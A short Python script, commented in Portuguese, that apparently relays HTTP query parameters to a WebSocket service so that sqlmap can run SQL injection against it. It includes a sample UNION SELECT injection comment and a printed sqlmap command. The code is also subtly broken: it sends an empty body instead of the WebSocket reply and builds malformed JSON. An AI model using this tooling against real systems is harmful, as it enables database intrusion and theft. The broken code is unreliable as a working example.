from http.server import HTTPServer, BaseHTTPRequestHandler
from websocket import create_connection
from urllib.parse import unquote, urlparse

servidor_ws = "ws://localhost:8000"

class Send_Websocket():	

	def enviar_ws(payload):
		connection_ws = create_connection(servidor_ws)

		message = unquote(payload).replace('"','\'')
		data = "{\"id\"}:{\""+message+"\"}" # payload para enviar ao websocket com a injeção sql

		connection_ws.send(data)
		resp = connection_ws.recv()
		connection_ws.close()

		if resp:
			return resp
		else:
			return ''

class HTTP(BaseHTTPRequestHandler):

	def do_GET(self):
		self.send_response(200)

		try:
			payload = urlparse(self.path).query.split('=',1)[1] # /?id=123
			
		except IndexError:
			payload = False
				
		if payload:
			content = Send_Websocket.enviar_ws(payload) # 123' UNION SELECT......
		else:
			content = 'Nenhum parâmetro especificado'

		self.send_header("Content-type","text/plain")
		self.end_headers()
		self.wfile.write(bytes())
		return
	
server = HTTPServer(("127.0.0.1",6060),HTTP)
print("Use esse comando em outro terminal para realização a injeção com sqlmap: sqlmap -u \"http://ip:port/?id=123\" -p id .....")
server.serve_forever()